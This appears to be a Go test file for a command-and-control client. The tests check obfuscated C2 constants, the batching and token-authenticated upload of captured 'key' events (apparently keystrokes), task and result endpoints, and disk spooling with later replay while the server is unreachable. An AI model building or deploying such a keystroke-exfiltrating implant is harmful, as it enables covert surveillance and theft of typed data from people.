package cmd

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"testing"
	"time"

	"golin/c2config"
)

func TestC2ConstsMatch(t *testing.T) {
	// 守护客户端混淆常量与 c2config 包的一致性,防止改了一边忘了另一边
	if c2Token != c2config.Token {
		t.Fatalf("c2Token = %q, want %q", c2Token, c2config.Token)
	}
	if c2Header != c2config.HeaderName {
		t.Fatalf("c2Header = %q, want %q", c2Header, c2config.HeaderName)
	}
	if c2Report != c2config.ReportPath {
		t.Fatalf("c2Report = %q, want %q", c2Report, c2config.ReportPath)
	}
	if c2Health != c2config.HealthPath {
		t.Fatalf("c2Health = %q, want %q", c2Health, c2config.HealthPath)
	}
	if c2Tasks != c2config.TasksPath {
		t.Fatalf("c2Tasks = %q, want %q", c2Tasks, c2config.TasksPath)
	}
	if c2Result != c2config.ResultPath {
		t.Fatalf("c2Result = %q, want %q", c2Result, c2config.ResultPath)
	}
}

// TestReportPipeline 验证完整上报链路:pushEvent → pipeline 攒批 → HTTP 上报
func TestReportPipeline(t *testing.T) {
	got := make(chan c2config.Batch, 4)
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// 心跳/任务等后台请求直接响应,避免干扰上报断言
		switch r.URL.Path {
		case c2config.HealthPath:
			_, _ = w.Write([]byte(`{"status":"ok"}`))
			return
		case c2config.TasksPath:
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write([]byte(`[]`))
			return
		case c2config.ResultPath:
			_, _ = w.Write([]byte(`{"status":"ok"}`))
			return
		}
		if r.URL.Path != c2config.ReportPath {
			t.Errorf("unexpected path: %s", r.URL.Path)
		}
		if r.Header.Get(c2config.HeaderName) != c2config.Token {
			t.Errorf("wrong token: %q", r.Header.Get(c2config.HeaderName))
		}
		var b c2config.Batch
		if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
			t.Errorf("decode batch: %v", err)
		}
		got <- b
		_, _ = w.Write([]byte(`{"status":"ok"}`))
	}))
	defer ts.Close()

	dataDirFn = func() string { return t.TempDir() }
	serverURL = ts.URL
	reportInterval = 1
	reportBatch = 3

	startReporter()
	defer func() {
		serverURL = ""
		stopReporter()
	}()

	for i := 0; i < 3; i++ {
		pushEvent("key", string(rune('a'+i)))
	}

	select {
	case b := <-got:
		if b.ClientID == "" {
			t.Fatal("empty client_id")
		}
		if len(b.Events) != 3 {
			t.Fatalf("want 3 events, got %d: %+v", len(b.Events), b.Events)
		}
		for i, ev := range b.Events {
			if ev.Type != "key" || ev.Data != string(rune('a'+i)) {
				t.Fatalf("unexpected event[%d]: %+v", i, ev)
			}
		}
	case <-time.After(5 * time.Second):
		t.Fatal("no batch received within 5s")
	}
}

// TestSpoolReplay 验证服务端不可达时批次落盘、恢复后补传
func TestSpoolReplay(t *testing.T) {
	dir := t.TempDir()
	dataDirFn = func() string { return dir }

	// 服务端未启动:spool 落盘
	serverURL = "http://127.0.0.1:1"
	clientID = "TEST-PC"
	events := []c2config.Event{{Time: time.Now().Unix(), Type: "key", Data: "x"}}
	sendBatch(events)
	if !fileExists(spoolPath()) {
		t.Fatal("spool file not created when server unreachable")
	}

	// 服务端恢复:补传成功并清空 spool
	got := make(chan c2config.Batch, 1)
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var b c2config.Batch
		json.NewDecoder(r.Body).Decode(&b)
		got <- b
		_, _ = w.Write([]byte(`{"status":"ok"}`))
	}))
	defer ts.Close()
	serverURL = ts.URL

	replaySpool()
	select {
	case b := <-got:
		if len(b.Events) != 1 || b.Events[0].Data != "x" {
			t.Fatalf("unexpected replayed batch: %+v", b)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("replay batch not received")
	}
	if fileExists(spoolPath()) {
		t.Fatal("spool file should be removed after successful replay")
	}
}

func fileExists(p string) bool {
	_, err := os.Stat(p)
	return err == nil
}
